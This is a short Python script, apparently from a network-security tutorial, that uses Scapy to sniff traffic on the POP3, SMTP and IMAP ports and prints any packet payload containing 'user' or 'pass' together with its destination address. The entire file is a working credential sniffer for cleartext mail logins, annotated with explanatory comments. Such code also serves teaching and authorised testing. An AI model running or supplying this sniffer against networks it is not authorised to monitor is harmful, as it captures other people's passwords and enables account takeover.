# Red lines under 'TCP' and 'IP' can be ignored. this is just static code analysis.
# Scapy loads many protocols dynamically at runtime
from scapy.all import sniff, TCP, IP

# The call back function that will receive the packet. Basically printing the packet using show().
def packet_callback(packet):
    # If the packet contains a payload:
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        # If the payload contains keywords 'user' or 'pass':
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f'[*] Destination: {packet[IP].dst}')
            print(f'[*] {str(packet[TCP].payload)}')

# Command Scapy to start sniffing.
def main():
    # 'Store' parameter with the value 0 insures scapy is not keeping captured data in memory (Long term sniffing).
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',prn=packet_callback,store=0)

if __name__ == '__main__':
    main()
